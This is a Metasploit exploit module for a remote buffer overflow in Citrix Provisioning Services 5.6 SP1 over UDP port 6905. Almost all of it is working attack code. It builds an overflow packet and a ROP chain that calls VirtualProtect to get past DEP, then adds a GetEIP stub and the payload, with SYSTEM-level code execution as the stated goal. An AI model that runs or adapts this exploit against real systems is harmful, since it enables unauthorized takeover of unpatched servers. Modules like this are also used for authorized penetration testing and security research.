##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Citrix Provisioning Services 5.6 SP1 Streamprocess Opcode 0x40020004 Buffer Overflow',
			'Description'    => %q{
					This module exploits a remote buffer overflow in the Citrix Provisioning Services
				5.6 SP1 (without Hotfix CPVS56SP1E043) by sending a malformed packet with the opcode
				0x40020004 (GetBootRecordRequest) to the 6905/UDP port. The module, which allows
				code execution under the context of SYSTEM, has been successfully tested on Windows Server
				2003 SP2 and Windows XP SP3.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'alino <26alino[at]gmail.com>', # citrix_streamprocess_data_msg author
					'juan vazquez'  # Metasploit module
				],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					['OSVDB', '75780'],
					['BID', '49803'],
					['URL', 'http://support.citrix.com/article/CTX130846']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00",
					'EncoderOptions' => {'BufferRegister'=>'ECX'},
				},
			'Platform'       => ['win'],
			'Targets'        =>
				[
					[ 'Citrix Provisioning Services 5.6 SP1',
						{
							'Offset' => 2012,
							'Ret'    => 0x0045403a # ADD ESP,664; RETN 04 streamprocess.exe
						}
					]
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Nov 04 2011',  #CTX130846 creation date
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(6905)], self.class)
	end

	def exploit

		packet =  "\x04\x00\x02\x40" # DATA MSG
		packet << rand_text_alpha_upper(18)
		packet << "\x00\x00\x00\x00" # Length
		packet << rand_text_alpha_upper(target['Offset'])
		packet << [target.ret].pack('V')

		rop_nop = [0x004a072c].pack('V') * 38 # RETN streamprocess.exe

		rop_gadgets =
		[
			0x0045b141, # POP EAX; RETN streamprocess.exe
			0x1009a1bc, # VirtualProtect()
			0x00436d44, # MOV EAX,DWORD PTR DS:[EAX]; RETN streamprocess.exe
			0x004b0bbe, # XCHG EAX,ESI; RETN streamprocess.exe
			0x004ad0cf, # POP EBP; RETN streamprocess.exe
			0x00455d9d, # PUSH ESP; RETN streamprocess.exe
			0x00497f5a, # POP EAX; RETN streamprocess.exe
			0xfffff9d0, # dwSize
			0x00447669, # NEG EAX; RETN streamprocess.exe
			0x004138a7, # ADD EBX,EAX; XOR EAX,EAX; RETN streamprocess.exe
			0x00426305, # POP ECX; RETN streamprocess.exe
			0x00671fb9, # lpflOldProtect
			0x004e41e6, # POP EDI; RETN streamprocess.exe
			0x0040f004, # RETN streamprocess.exe
			0x00495c05, # POP EAX; RETN streamprocess.exe
			0xffffffc0, # flNewProtect
			0x0042c79a, # NEG EAX; RETN streamprocess.exe
			0x0049b676, # XCHG EAX,EDX; RETN streamprocess.exe
			0x0045c1fa, # POP EAX; RETN streamprocess.exe
			0x90909090, # NOP
			0x00435bbe, # PUSHAD; RETN streamprocess.exe
		].pack("V*")

		packet[386, rop_nop.length] = rop_nop
		packet[538, rop_gadgets.length] = rop_gadgets
		# Put payload address in ecx
		geteip = "\xeb\x03" # jmp short 0x5
		geteip << "\x59" # pop ecx
		geteip << "\xff\xd1" # call ecx
		geteip << "\xe8\xf8\xff\xff\xff" # call to "pop / call"
		packet[622, 10] = geteip
		packet[632, payload.encoded.length] = payload.encoded

		print_status("Trying target #{target.name}...")

		connect_udp
		udp_sock.put(packet)

		handler
		disconnect_udp

	end
end
